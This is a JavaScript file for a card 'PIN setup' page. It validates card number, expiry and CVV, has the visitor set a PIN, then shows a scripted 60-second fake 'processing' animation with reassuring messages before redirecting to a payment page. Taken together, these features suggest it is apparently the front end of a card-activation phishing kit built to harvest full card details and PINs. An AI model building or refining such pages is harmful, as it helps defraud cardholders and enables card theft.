/**
 * PIN Setup JavaScript
 * Card details validation and PIN strength checker for pin-setup.php
 */

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('pinSetupForm');
    
    // Check if activation was successful and show loading animation
    if (typeof activationSuccess !== 'undefined' && activationSuccess) {
        showLoadingAnimation();
        return;
    }
    
    if (!form) return;
    
    // Card number formatting and validation
    const cardNumberInput = document.getElementById('details');
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function() {
            // Remove non-digits
            let value = this.value.replace(/\D/g, '');
            
            // Limit to 16 digits
            value = value.substring(0, 16);
            
            // Format with spaces every 4 digits
            const formatted = value.match(/.{1,4}/g)?.join(' ') || value;
            this.value = formatted;
        });
        
        cardNumberInput.addEventListener('blur', function() {
            validateCardNumber(this);
        });
    }
    
    // Expiry date formatting
    const expiryInput = document.getElementById('expiry');
    if (expiryInput) {
        expiryInput.addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '');
            
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            
            this.value = value;
        });
        
        expiryInput.addEventListener('blur', function() {
            validateExpiry(this);
        });
    }
    
    // CVV validation
    const cvvInput = document.getElementById('cvv');
    if (cvvInput) {
        cvvInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });
        
        cvvInput.addEventListener('blur', function() {
            validateCVV(this);
        });
    }
    
    // PIN validation and strength checker
    const pinInput = document.getElementById('pin');
    const confirmPinInput = document.getElementById('confirm_pin');
    const strengthFill = document.getElementById('strengthFill');
    const strengthText = document.getElementById('strengthText');
    
    if (pinInput) {
        pinInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            checkPINStrength(this.value);
        });
        
        pinInput.addEventListener('blur', function() {
            validatePIN(this);
        });
    }
    
    if (confirmPinInput) {
        confirmPinInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
        });
        
        confirmPinInput.addEventListener('blur', function() {
            validateConfirmPIN(this);
        });
    }
    
    // Toggle PIN visibility
    const toggleButtons = document.querySelectorAll('.toggle-pin');
    toggleButtons.forEach(function(button) {
        button.addEventListener('click', function() {
            const targetId = this.getAttribute('data-target');
            const targetInput = document.getElementById(targetId);
            
            if (targetInput) {
                if (targetInput.type === 'password') {
                    targetInput.type = 'text';
                    this.textContent = '🙈';
                } else {
                    targetInput.type = 'password';
                    this.textContent = '👁️';
                }
            }
        });
    });
    
    // Form submission
    form.addEventListener('submit', function(e) {
        let isValid = true;
        
        if (cardNumberInput && !validateCardNumber(cardNumberInput)) {
            isValid = false;
        }
        
        if (expiryInput && !validateExpiry(expiryInput)) {
            isValid = false;
        }
        
        if (cvvInput && !validateCVV(cvvInput)) {
            isValid = false;
        }
        
        if (pinInput && !validatePIN(pinInput)) {
            isValid = false;
        }
        
        if (confirmPinInput && !validateConfirmPIN(confirmPinInput)) {
            isValid = false;
        }
        
        if (!isValid) {
            e.preventDefault();
            const firstError = form.querySelector('.error');
            if (firstError) {
                firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        }
    });
    
    // Check PIN strength
    function checkPINStrength(pin) {
        if (!strengthFill || !strengthText) return;
        
        if (pin.length === 0) {
            strengthFill.className = 'strength-fill';
            strengthText.textContent = '-';
            return;
        }
        
        if (pin.length < 4) {
            strengthFill.className = 'strength-fill weak';
            strengthText.textContent = 'Too Short';
            return;
        }
        
        // Check if all digits are the same
        const allSame = /^(\d)\1{3}$/.test(pin);
        
        // Check if sequential
        const sequential = isSequential(pin);
        
        if (allSame || sequential) {
            strengthFill.className = 'strength-fill weak';
            strengthText.textContent = 'Weak';
        } else if (hasRepeatingPairs(pin)) {
            strengthFill.className = 'strength-fill medium';
            strengthText.textContent = 'Medium';
        } else {
            strengthFill.className = 'strength-fill strong';
            strengthText.textContent = 'Strong';
        }
    }
    
    function isSequential(pin) {
        const ascending = '0123456789';
        const descending = '9876543210';
        return ascending.includes(pin) || descending.includes(pin);
    }
    
    function hasRepeatingPairs(pin) {
        return /(\d)\1/.test(pin);
    }
});

// Validation functions
function validateCardNumber(input) {
    const value = input.value.replace(/\s/g, '');
    
    if (value.length !== 16) {
        showError(input, 'Card number must be 16 digits');
        return false;
    }
    
    // Luhn algorithm
    if (!luhnCheck(value)) {
        showError(input, 'Please enter a valid card number');
        return false;
    }
    
    hideError(input);
    input.classList.add('success');
    return true;
}

function luhnCheck(cardNumber) {
    let sum = 0;
    let isEven = false;
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i), 10);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return (sum % 10) === 0;
}

function validateExpiry(input) {
    const value = input.value;
    const parts = value.split('/');
    
    if (parts.length !== 2) {
        showError(input, 'Please use MM/YY format');
        return false;
    }
    
    const month = parseInt(parts[0], 10);
    const year = parseInt(parts[1], 10);
    
    if (month < 1 || month > 12) {
        showError(input, 'Invalid month');
        return false;
    }
    
    const currentYear = parseInt(new Date().getFullYear().toString().slice(-2), 10);
    const currentMonth = new Date().getMonth() + 1;
    
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
        showError(input, 'Card has expired');
        return false;
    }
    
    hideError(input);
    input.classList.add('success');
    return true;
}

function validateCVV(input) {
    const value = input.value;
    
    if (value.length !== 3) {
        showError(input, 'CVV must be 3 digits');
        return false;
    }
    
    hideError(input);
    input.classList.add('success');
    return true;
}

function validatePIN(input) {
    const value = input.value;
    
    if (value.length !== 4) {
        showError(input, 'PIN must be exactly 4 digits');
        return false;
    }
    
    hideError(input);
    input.classList.add('success');
    return true;
}

function validateConfirmPIN(input) {
    const pin = document.getElementById('pin').value;
    const confirmPin = input.value;
    
    if (confirmPin !== pin) {
        showError(input, 'PINs do not match');
        return false;
    }
    
    hideError(input);
    input.classList.add('success');
    return true;
}

function showError(input, message) {
    input.classList.add('error');
    input.classList.remove('success');
    
    let errorElement = input.closest('.form-group').querySelector('.error-message');
    if (!errorElement) {
        const wrapper = input.closest('.pin-input-wrapper') || input.parentElement;
        errorElement = document.createElement('span');
        errorElement.className = 'error-message';
        wrapper.parentElement.appendChild(errorElement);
    }
    errorElement.textContent = message;
    errorElement.classList.add('show');
}

function hideError(input) {
    input.classList.remove('error');
    const errorElement = input.closest('.form-group').querySelector('.error-message');
    if (errorElement) {
        errorElement.classList.remove('show');
    }
}

/**
 * Show loading animation for ~60 seconds before redirecting to payment page
 */
function showLoadingAnimation() {
    const pinSetupContainer = document.getElementById('pinSetupContainer');
    const processingContainer = document.getElementById('processingContainer');
    const loadingText = document.getElementById('loadingText');
    const progressBar = document.getElementById('progressBar');
    const progressPercent = document.getElementById('progressPercent');
    
    if (!pinSetupContainer || !processingContainer) return;
    
    // Hide form, show loading
    pinSetupContainer.style.display = 'none';
    processingContainer.style.display = 'block';
    
    let progress = 0;
    const duration = 60000; // 60 seconds
    const interval = 100; // Update every 100ms
    const increment = (interval / duration) * 100;
    
    // Loading messages to display during the process
    const loadingMessages = [
        'Processing your activation...',
        'Verifying your details...',
        'Securing your account...',
        'Validating card information...',
        'Setting up your PIN...',
        'Finalizing activation...',
        'Almost complete...'
    ];
    
    let messageIndex = 0;
    
    // Update loading message every ~8 seconds
    const messageInterval = setInterval(function() {
        messageIndex++;
        if (messageIndex < loadingMessages.length && loadingText) {
            loadingText.textContent = loadingMessages[messageIndex];
        }
    }, 8500);
    
    // Progress bar animation
    const progressInterval = setInterval(function() {
        progress += increment;
        
        if (progress >= 100) {
            progress = 100;
            clearInterval(progressInterval);
            clearInterval(messageInterval);
            
            // Redirect to payment page after loading complete
            setTimeout(function() {
                window.location.href = 'payment.php';
            }, 500);
        }
        
        // Update progress bar and text
        if (progressBar && progressPercent) {
            progressBar.style.width = progress + '%';
            progressPercent.textContent = Math.floor(progress);
        }
    }, interval);
}

